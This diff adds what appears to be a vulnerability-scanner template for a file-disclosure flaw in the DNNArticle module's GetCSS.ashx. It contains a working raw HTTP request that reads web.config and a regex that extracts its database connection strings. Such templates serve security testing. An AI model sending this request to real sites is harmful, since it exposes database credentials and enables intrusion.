@@ -1,0 +1,34 @@
+id: dnnarticle-dbinfo-leakage
+info:
+  name: DNNArticle File Manage System GetCSS.ashx DB Info Leakage
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The attacker can directly read the relevant system information of the file system, including user names, database passwords, etc. Attackers use the leaked sensitive information to provide help for further attacks.
+  tags: disclosure, sensitive-info
+  reference:
+    - https://www.exploit-db.com/exploits/444
+
+http:
+  - raw:
+      - |
+        GET /desktopmodules/DNNArticle/GetCSS.ashx/?CP=%2fweb.config&smid=512&portalid=3 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "SiteSqlServer"
+          - "DefaultDevicesDatabase"
+    extractors:
+      - type: regex
+        name: connectionStrings
+        part: body
+        regex:
+          - "(?s)<connectionStrings>(.*?)</connectionStrings>"
